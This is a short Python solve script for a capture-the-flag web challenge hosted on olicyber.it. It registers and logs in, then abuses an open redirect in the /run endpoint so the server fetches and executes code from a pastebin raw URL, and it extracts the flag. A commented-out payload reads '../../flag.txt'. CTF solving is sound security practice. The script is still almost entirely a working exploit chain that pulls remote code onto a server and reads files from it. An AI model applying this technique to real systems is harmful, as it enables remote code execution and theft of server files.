import requests, re

site = "http://cloud_free_tier.challs.olicyber.it"
s = requests.Session()
s.post(site + "/register", data={"username":"sas123sas", "password":"sas123sas", "repeat_password":"sas123sas"})
s.post(site + "/login", data={"username":"sas123sas", "password":"sas123sas"})
print(s.cookies.get_dict())
r = s.post(site + "/run", data={"file":"/logout?redirect=https://pastebin.com/raw/XJ0MvVrv"})
flag = re.findall(r"flag{.*?}", r.text)[0]
print(flag)
'''
flag = open("../../flag.txt")
print(flag.read())
'''
